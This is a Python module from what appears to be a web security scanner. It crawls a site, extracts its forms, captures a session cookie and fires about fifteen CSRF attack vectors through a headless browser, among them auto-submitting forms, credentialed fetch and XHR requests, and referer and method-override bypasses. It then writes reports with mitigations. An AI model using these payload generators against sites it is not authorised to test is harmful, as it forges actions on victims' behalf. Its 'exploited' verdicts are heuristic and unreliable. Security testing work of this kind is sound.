#!/usr/bin/env python3
"""
backend/csrf/module.py

Compatibility-adapter CSRF module for the scanner.

Exports:
 - crawl_site_multithread(base_url, session, max_depth=3, max_workers=10)
 - extract_forms(url, session)
 - build_csrf_cfg_from_forms(base_url, session, forms)
 - run_suite(cfg, out_dir, max_actions=None, per_action_timeout=10, headless=True)
 - run(url, out_dir, depth=2)  # lightweight entrypoint used by backend.app
"""

import os
import time
import json
from pathlib import Path
from urllib.parse import urljoin, urlparse, urlunparse, parse_qsl, urlencode
from collections import deque
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from typing import Dict, List
from dataclasses import dataclass, field

import requests
from bs4 import BeautifulSoup
from jinja2 import Template

# Playwright optional (preferred)
try:
    from playwright.sync_api import sync_playwright
    playwright_available = True
except Exception:
    playwright_available = False

# Selenium fallback (if available)
try:
    from selenium import webdriver  # type: ignore
    from selenium.webdriver.chrome.options import Options  # type: ignore
    selenium_available = True
except Exception:
    selenium_available = False

# ---- Config ----
MAX_WORKERS = int(os.getenv("CSRF_MAX_WORKERS", "8"))
REQUEST_TIMEOUT = int(os.getenv("CSRF_REQUEST_TIMEOUT", "10"))
CRAWL_USER_AGENT = "UnifiedBACCSRF/1.0"
STATIC_EXTENSIONS = (
    ".jpg", ".jpeg", ".png", ".gif", ".svg", ".webp",
    ".mp4", ".avi", ".mov", ".wmv", ".mkv",
    ".css", ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".ico", ".pdf", ".zip", ".rar", ".7z", ".tar", ".gz",
    ".mp3", ".ogg"
)
MAX_TOTAL_LINKS = int(os.getenv("CSRF_MAX_TOTAL_LINKS", "5000"))
CSRF_ALLOW_CROSS_ORIGIN = True  # repo default

# ---------------------------------------------------------
# Helpers
# ---------------------------------------------------------
def normalize_url(u: str) -> str:
    p = urlparse(u)
    p = p._replace(fragment="")
    out = urlunparse(p)
    if out.endswith("/") and urlparse(out).path != "/":
        out = out.rstrip("/")
    return out

def looks_static(href: str) -> bool:
    if not href:
        return True
    lower = href.lower()
    for ext in STATIC_EXTENSIONS:
        if lower.endswith(ext):
            return True
    return False

def _same_origin(a: str, b: str) -> bool:
    pa = urlparse(a)
    pb = urlparse(b)
    return (pa.scheme, pa.hostname, pa.port) == (pb.scheme, pb.hostname, pb.port)

def _path_depth_relative(base: str, target: str) -> int:
    pb = urlparse(base).path.rstrip("/")
    pt = urlparse(target).path.rstrip("/")
    if not pb:
        pb = ""
    if not pt:
        pt = ""
    if pt.startswith(pb):
        rel = pt[len(pb):].lstrip("/")
        if not rel:
            return 0
        return len([p for p in rel.split("/") if p])
    return 999

# ---------------------------------------------------------
# Crawl
# ---------------------------------------------------------
def fetch_links_single(url: str, session: requests.Session) -> List[str]:
    links = []
    headers = {"User-Agent": CRAWL_USER_AGENT}
    try:
        r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        text = r.text or ""
        soup = BeautifulSoup(text, "lxml")
        for tag in soup.find_all(["a", "form", "script", "link"]):
            href = tag.get("href") or tag.get("action") or tag.get("src")
            if not href:
                continue
            if href.startswith("javascript:") or href.startswith("mailto:") or href.strip() == "#":
                continue
            if looks_static(href):
                continue
            try:
                full = urljoin(url, href)
                full_norm = normalize_url(full)
                links.append(full_norm)
            except Exception:
                continue
    except Exception:
        # swallow errors — caller expects a robust crawl
        return []
    return links

def crawl_site_multithread(base_url: str, session: requests.Session, max_depth: int = 3, max_workers: int = MAX_WORKERS) -> List[str]:
    base_norm = normalize_url(base_url)
    discovered_depth: Dict[str, int] = {base_norm: 0}
    visited = set()
    q = deque([base_norm])
    session.headers.update({"User-Agent": CRAWL_USER_AGENT})

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        active = {}
        try:
            while q or active:
                while q and len(active) < max_workers and len(discovered_depth) < MAX_TOTAL_LINKS:
                    url = q.popleft()
                    if url in visited:
                        continue
                    visited.add(url)
                    fut = ex.submit(fetch_links_single, url, session)
                    active[fut] = url

                if not active:
                    if q:
                        continue
                    else:
                        break

                done, _ = wait(active.keys(), timeout=5, return_when=FIRST_COMPLETED)
                for fut in list(done):
                    src_url = active.pop(fut, None)
                    try:
                        links = fut.result(timeout=1) or []
                    except Exception:
                        links = []
                    for l in links:
                        if not _same_origin(base_norm, l):
                            continue
                        depth = _path_depth_relative(base_norm, l)
                        if depth > max_depth:
                            continue
                        if l not in discovered_depth:
                            discovered_depth[l] = depth
                            if depth < max_depth:
                                q.append(l)
        except Exception:
            pass

    final_links = sorted(discovered_depth.keys())

    # Selenium fallback if few links and selenium available
    if len(final_links) < 15 and selenium_available:
        try:
            chrome_options = Options()
            try:
                chrome_options.add_argument("--headless=new")
            except Exception:
                chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--ignore-certificate-errors")
            for p in ("/usr/bin/chromium-browser", "/usr/bin/chromium", "/usr/bin/google-chrome"):
                if os.path.exists(p):
                    chrome_options.binary_location = p
                    break
            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(30)
            driver.get(base_norm)
            time.sleep(1)
            elems = driver.find_elements("xpath", "//a[@href] | //form[@action] | //script[@src] | //*[@routerlink]")
            for e in elems:
                try:
                    href = (e.get_attribute("href") or e.get_attribute("action") or e.get_attribute("src") or e.get_attribute("routerlink"))
                    if href and not looks_static(href):
                        full_norm = normalize_url(urljoin(base_norm, href))
                        if _same_origin(base_norm, full_norm):
                            depth = _path_depth_relative(base_norm, full_norm)
                            if depth <= max_depth and full_norm not in discovered_depth:
                                discovered_depth[full_norm] = depth
                except Exception:
                    continue
            try:
                driver.quit()
            except Exception:
                pass
            final_links = sorted(discovered_depth.keys())
        except Exception:
            pass

    return final_links

# ---------------------------------------------------------
# Forms
# ---------------------------------------------------------
def extract_forms(url: str, session: requests.Session) -> List[Dict]:
    forms = []
    try:
        r = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text or "", "lxml")
        for idx, form in enumerate(soup.find_all("form"), start=1):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            full_url = urljoin(url, action)
            params = {}
            for inp in form.find_all(["input", "select", "textarea"]):
                name = inp.get("name")
                if not name:
                    continue
                val = inp.get("value", "")
                typ = (inp.get("type") or "").lower()
                if not val:
                    if typ == "email":
                        val = "test@example.com"
                    elif typ == "number":
                        val = "1"
                    else:
                        val = ""
                params[name] = val
            forms.append({"url": full_url, "method": method, "params": params, "name": form.get("id") or form.get("name") or f"form_{idx}"})
    except Exception:
        return []
    return forms

# ---------------------------------------------------------
# Build CSRF config (captures session cookie)
# ---------------------------------------------------------
def build_csrf_cfg_from_forms(base_url: str, session: requests.Session, forms: List[Dict]) -> Dict:
    actions = []
    for idx, f in enumerate(forms, 1):
        try:
            name = f.get("name") or f.get("id") or f"form_{idx}"
            method = (f.get("method") or "post").upper()
            params = f.get("params", {}) or {}
            actions.append({"name": name, "method": method, "url": f.get("url"), "params": params, "body_format": "form"})
        except Exception:
            continue

    cookie = {}
    try:
        # prefer session-like cookie names
        ck = session.cookies.get_dict()
        if ck:
            sel = None
            for k in ck:
                if any(x in k.lower() for x in ("session", "sid", "php", "jwt", "auth")):
                    sel = k
                    break
            if not sel:
                sel = next(iter(ck.keys()))
            cookie = {"name": sel, "value": ck.get(sel), "domain": urlparse(base_url).hostname, "path": "/"}
    except Exception:
        cookie = {}

    cfg = {"base_url": base_url, "actions": actions, "optional": {"jwt": False}, "session_cookie": cookie or {}}
    try:
        v = cookie.get("value", "") or ""
        if isinstance(v, str) and v.count(".") == 2 and len(v.split(".")[0]) > 10:
            cfg["optional"]["jwt"] = True
    except Exception:
        pass
    return cfg

# ---------------------------------------------------------
# CSRF attack vectors & reporting
# ---------------------------------------------------------
@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str, str] = field(default_factory=dict)
    body_format: str = "form"

def _build_query(url: str, params: dict) -> str:
    if not params:
        return url
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q.update(params)
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q, doseq=True), u.fragment))

def _auth_header_pair(auth_header: str):
    if not auth_header or ":" not in auth_header:
        return None
    k, v = auth_header.split(":", 1)
    return k.strip(), v.strip()

def html_img(url): return f'<img src="{url}"/>'
def html_script(url): return f'<script src="{url}"></script>'
def html_iframe(url): return f'<iframe src="{url}"></iframe>'
def html_meta_refresh(url): return f'<meta http-equiv="refresh" content="0; url={url}">'
def html_link(url, noreferrer=False):
    rel = ' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>go.click()</script>'
def html_form_post(url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    return f'<form id="f" action="{url}" method="POST">{inputs}</form><script>f.submit()</script>'
def html_fetch_post(url, params, auth_header, body_format):
    import json as _json
    from urllib.parse import urlencode as _urlencode_local
    hk = _auth_header_pair(auth_header) if auth_header else None
    if body_format == "json":
        headers = '"Content-Type":"application/json"'
        body_js = _json.dumps(params or {})
    else:
        headers = '"Content-Type":"application/x-www-form-urlencoded"'
        body_js = '"'+_urlencode_local(params or {})+'"'
    extra = f',"{hk[0]}":"{hk[1]}"' if hk else ""
    return f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},body:{body_js}}})</script>'
def html_xhr(url, params, auth_header, body_format):
    import json as _json
    from urllib.parse import urlencode as _urlencode_local
    hk = _auth_header_pair(auth_header) if auth_header else None
    header_setter = f'x.setRequestHeader("{hk[0]}","{hk[1]}");' if hk else ''
    body = _json.dumps(params or {}) if body_format == "json" else _urlencode_local(params or {})
    return f'<script>var x=new XMLHttpRequest();x.open("POST","{url}",true);x.withCredentials=true;{header_setter}x.send({json.dumps(body)});</script>'
def html_multipart(url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
    return f'<form id="mf" action="{url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="f"></form><script>mf.submit()</script>'
def html_duplicate_token(url, params):
    p = params.copy()
    if "token" in p:
        p["duplicate_token"] = p["token"]
    return html_form_post(url, p)
def html_samesite_refresh(url, params):
    from urllib.parse import urlencode as _urlencode_local
    return f'<script>document.cookie="refreshCSRF=1; SameSite=Lax";fetch("{url}",{{method:"POST",body:"{_urlencode_local(params)}"}})</script>'
def html_referer_bypass(url, params):
    ins = "".join([f"<input type=hidden name={k} value={v}>" for k, v in params.items()])
    return f'<iframe sandbox="allow-scripts allow-forms" srcdoc=\'<form action=\"{url}\" method=\"POST\">{ins}<input type=submit></form><script>document.forms[0].submit()</script>\'></iframe>'
def html_subdomain_bypass(url, params):
    from urllib.parse import urlencode as _urlencode_local
    return f'<script>fetch("{url}",{{method:"POST",mode:"cors",body:"{_urlencode_local(params)}"}})</script>'
def html_method_override(url, params):
    return html_link(_build_query(url, {**params, "_method": "POST"}))

def classify_exploit(csrf_applicable: bool, jwt_based: bool, vector_id: str, status):
    if jwt_based:
        return False, "Not applicable (JWT/header-based auth)"
    if not csrf_applicable:
        return False, "Not applicable (no session-bound action)"
    if not status or (isinstance(status, int) and status >= 400):
        return False, "HTTP error or failed to execute"
    if vector_id == "noreferrer_link":
        return True, "Accepted no Referer"
    if vector_id == "method_override":
        return True, "Accepted method override"
    return True, "Accepted (heuristic)"

_CSRF_TEMPLATE = """<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
<style>body{font-family:Arial;margin:20px}th,td{border:1px solid #ddd;padding:6px}table{border-collapse:collapse;width:100%}</style>
<h1>CSRF Attack Suite Report</h1>
<p>Generated {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}}</p>
{% if exploited %}<h3>✅ Exploited Vectors</h3><ul>{% for e in exploited %}<li>{{e.action}} → {{e.vector}} ({{e.status}}) → {{e.note}}<br><b>Mitigation:</b> {{e.mitigation}}</li>{% endfor %}</ul>{% else %}<p>ℹ️ None exploited</p>{% endif %}
<h2>Detailed Results</h2>
<table><tr><th>Action</th><th>Vector</th><th>Status</th><th>Exploited</th><th>Note</th><th>Mitigation</th></tr>
{% for r in results %}<tr><td>{{r.action}}<br><small>{{r.url}}</small></td><td>{{r.vector}}</td><td>{{r.status}}</td><td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td><td>{{r.note}}</td><td>{{r.mitigation}}</td></tr>{% endfor %}</table></html>"""

def write_csrf_reports(base: str, results: List[Dict], exploited: List[Dict], out_dir: str, domain: str):
    os.makedirs(out_dir, exist_ok=True)
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    # Use Path to safely build filenames
    pfx = Path(out_dir) / f"{domain}_csrf_{ts}"
    json_path = pfx.with_suffix(".json")
    exploited_json_path = pfx.with_name(pfx.name + "_exploited.json")
    html_path = pfx.with_suffix(".html")
    exploited_html_path = pfx.with_name(pfx.name + "_exploited.html")
    curl_path = pfx.with_name(pfx.name + "_curl.txt")

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({"generated": time.ctime(), "base": base, "results": results, "exploited": exploited}, f, indent=2)
    with open(exploited_json_path, "w", encoding="utf-8") as f:
        json.dump([r for r in results if r.get("exploited")], f, indent=2)

    html = Template(_CSRF_TEMPLATE).render(ts=time.ctime(), base=base, actions=len({r["action"] for r in results}), total=len(results), results=results, exploited=exploited)
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)

    exp_html = Template(_CSRF_TEMPLATE).render(ts=time.ctime(), base=base, actions=len({r["action"] for r in results}), total=len(results), results=[r for r in results if r.get("exploited")], exploited=exploited)
    with open(exploited_html_path, "w", encoding="utf-8") as f:
        f.write(exp_html)

    with open(curl_path, "w", encoding="utf-8") as f:
        for r in results:
            f.write(r.get("curl", "") + "\n")

    return str(html_path), str(json_path), str(exploited_html_path), str(exploited_json_path), str(curl_path)

# ---------------------------------------------------------
# run_suite (Playwright)
# ---------------------------------------------------------
def run_suite(cfg: Dict, out_dir: str, max_actions: int = None, per_action_timeout: int = 10, headless: bool = True):
    base = cfg.get("base_url", "").rstrip("/")
    actions = [Action(**a) for a in cfg.get("actions", [])]
    opt = cfg.get("optional", {})
    session_cookie = cfg.get("session_cookie") or {}
    jwt_based = bool(opt.get("jwt", False))
    csrf_applicable = bool(session_cookie and session_cookie.get("value"))

    if max_actions is not None and max_actions > 0:
        actions = actions[:max_actions]

    results = []
    exploited = []
    domain = urlparse(base).hostname or "target"

    if not playwright_available:
        # fallback minimal report
        return write_csrf_reports(base, [{"action": "none", "note": "Playwright not available", "exploited": False}], [], out_dir, domain)

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=headless)
            ctx = browser.new_context(ignore_https_errors=True)
            ctx.set_default_navigation_timeout(int(per_action_timeout * 1000))
            ctx.set_default_timeout(int(per_action_timeout * 1000))
            # Add cookie if available
            if session_cookie and session_cookie.get("name") and session_cookie.get("value"):
                try:
                    ctx.add_cookies([{
                        "name": session_cookie["name"],
                        "value": session_cookie["value"],
                        "domain": session_cookie.get("domain", urlparse(base).hostname),
                        "path": session_cookie.get("path", "/")
                    }])
                except Exception:
                    pass
            page = ctx.new_page()

            for idx, act in enumerate(actions, 1):
                # skip cross-origin if desired
                if not CSRF_ALLOW_CROSS_ORIGIN:
                    try:
                        th = urlparse(act.url).hostname
                        bh = urlparse(base).hostname
                        if th and bh and th != bh:
                            results.append({"action": act.name, "url": act.url, "vector": "skip_external", "req_method": None, "status": None, "exploited": False, "note": "Skipped external origin", "mitigation": "Enable cross-origin testing", "curl": ""})
                            continue
                    except Exception:
                        pass

                vecs = [
                    ("img_get", html_img(_build_query(act.url, act.params)), "GET"),
                    ("script_get", html_script(_build_query(act.url, act.params)), "GET"),
                    ("iframe_get", html_iframe(_build_query(act.url, act.params)), "GET"),
                    ("meta_refresh", html_meta_refresh(_build_query(act.url, act.params)), "GET"),
                    ("link_click", html_link(_build_query(act.url, act.params)), "GET"),
                    ("noreferrer_link", html_link(_build_query(act.url, act.params), True), "GET"),
                    ("form_post", html_form_post(act.url, act.params), "POST"),
                    ("fetch_post", html_fetch_post(act.url, act.params, opt.get("auth_header"), act.body_format), "POST"),
                    ("xhr_post", html_xhr(act.url, act.params, opt.get("auth_header"), act.body_format), "POST"),
                    ("multipart_post", html_multipart(act.url, act.params), "POST"),
                    ("duplicate_token", html_duplicate_token(act.url, act.params), "POST"),
                    ("samesite_refresh", html_samesite_refresh(act.url, act.params), "POST"),
                    ("referer_bypass", html_referer_bypass(act.url, act.params), "POST"),
                    ("subdomain_bypass", html_subdomain_bypass(act.url, act.params), "POST"),
                    ("method_override", html_method_override(act.url, act.params), "GET"),
                ]
                for vid, html, rm in vecs:
                    row = {"action": act.name, "url": act.url, "vector": vid, "req_method": rm, "status": None, "exploited": False, "note": None, "mitigation": None, "curl": f"curl -X {rm} '{act.url}'"}
                    try:
                        # try set_content
                        try:
                            page.set_content(html, wait_until="domcontentloaded")
                            page.wait_for_timeout(200)
                            status = 200
                        except Exception:
                            try:
                                safe_html = f"<!doctype html><meta charset='utf-8'><body>{html}</body>"
                                data_url = "data:text/html;charset=utf-8," + requests.utils.requote_uri(safe_html)
                                page.goto(data_url, wait_until="domcontentloaded", timeout=int(per_action_timeout * 1000))
                                page.wait_for_timeout(200)
                                status = 200
                            except Exception:
                                status = 500
                        exploited_flag, why = classify_exploit(csrf_applicable, jwt_based, vid, status)
                        mit = "Use CSRF tokens + SameSite=strict and strict Origin/Referer checks." if exploited_flag else "N/A"
                        row.update({"status": status, "exploited": exploited_flag, "note": why, "mitigation": mit})
                    except Exception as e:
                        row.update({"status": 500, "exploited": False, "note": f"Error: {e}", "mitigation": "N/A"})
                    results.append(row)
                    if row.get("exploited"):
                        exploited.append({"action": act.name, "vector": vid, "status": row.get("status"), "note": row.get("note"), "mitigation": row.get("mitigation")})
            try:
                browser.close()
            except Exception:
                pass
    except Exception:
        # If Playwright fails silently produce a minimal result (caller expects tuple)
        return write_csrf_reports(base, [{"action": "none", "note": "Playwright error; minimal report created", "exploited": False}], [], out_dir, urlparse(base).hostname or "target")

    return write_csrf_reports(base, results, exploited, out_dir, urlparse(base).hostname or "target")

# ---------------------------------------------------------
# run() entrypoint used by backend.app
# ---------------------------------------------------------
def run(url: str, out_dir: str, depth: int = 2):
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    domain = (urlparse(url).hostname or "target").replace(".", "_")

    # Primary attempt: crawl + extract forms + run_suite
    try:
        session = requests.Session()
        session.headers.update({"User-Agent": CRAWL_USER_AGENT})
        links = crawl_site_multithread(url, session, max_depth=depth)
        forms = []
        for l in links:
            try:
                forms.extend(extract_forms(l, session))
            except Exception:
                continue

        cfg = build_csrf_cfg_from_forms(url, session, forms)
        cfg["optional"]["visited_links"] = links

        if cfg.get("actions"):
            outputs = None
            try:
                outputs = run_suite(cfg, out_dir=str(out_dir), max_actions=None, per_action_timeout=10, headless=True)
            except Exception:
                outputs = None
            if outputs:
                html_path, json_path, html_ex, json_ex, curl_txt = outputs
                ret = {}
                if json_path:
                    ret["json"] = str(json_path)
                if html_path:
                    ret["html"] = str(html_path)
                if html_ex:
                    ret["html_exploited"] = str(html_ex)
                ret["forms_found"] = len(cfg.get("actions", []))
                ret["links_crawled"] = len(links)
                return ret
    except Exception:
        pass

    # Fallback minimal detection
    results = []
    try:
        session = requests.Session()
        session.headers.update({"User-Agent": CRAWL_USER_AGENT})
        r = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text or "", "lxml")
        forms = soup.find_all("form")
        for idx, form in enumerate(forms, start=1):
            method = (form.get("method") or "get").lower()
            inputs = form.find_all("input")
            hidden_names = [(i.get("name") or "").lower() for i in inputs if (i.get("type") or "").lower() == "hidden"]
            has_token = any(("csrf" in n or "token" in n) for n in hidden_names)
            action = form.get("action") or url
            if action.startswith("http://") or action.startswith("https://"):
                full_action = action
            else:
                full_action = url.rstrip("/") + "/" + action.lstrip("/")
            results.append({
                "action": full_action,
                "method": method,
                "vector": "form_post" if method == "post" else "form_get",
                "missing_csrf": (method == "post" and not has_token),
                "status": 200,
                "exploited": False,
                "note": "Missing CSRF token" if (method == "post" and not has_token) else "Token present or not required"
            })
    except Exception as e:
        results.append({
            "action": url,
            "method": "get",
            "vector": "page",
            "status": 0,
            "exploited": False,
            "note": f"Enumeration error: {e}",
        })

    # Write minimal JSON + HTML so backend links work
    timestamp = ts
    json_out = out_dir / f"{domain}_csrf_{timestamp}.json"
    html_out = out_dir / f"{domain}_csrf_{timestamp}.html"
    try:
        with open(json_out, "w", encoding="utf-8") as f:
            json.dump({
                "generated": time.strftime("%Y-%m-%d %H:%M:%S"),
                "base_url": url,
                "results": results,
                "exploited": [r for r in results if r.get("exploited")]
            }, f, indent=2)
    except Exception:
        json_out = None

    try:
        tpl = Template(_CSRF_TEMPLATE)
        with open(html_out, "w", encoding="utf-8") as f:
            f.write(tpl.render(ts=time.ctime(), base=url, actions=len(results), total=len(results), results=results, exploited=[r for r in results if r.get("exploited")]))
    except Exception:
        html_out = None

    ret = {}
    if json_out:
        ret["json"] = str(json_out)
    if html_out:
        ret["html"] = str(html_out)
    return ret
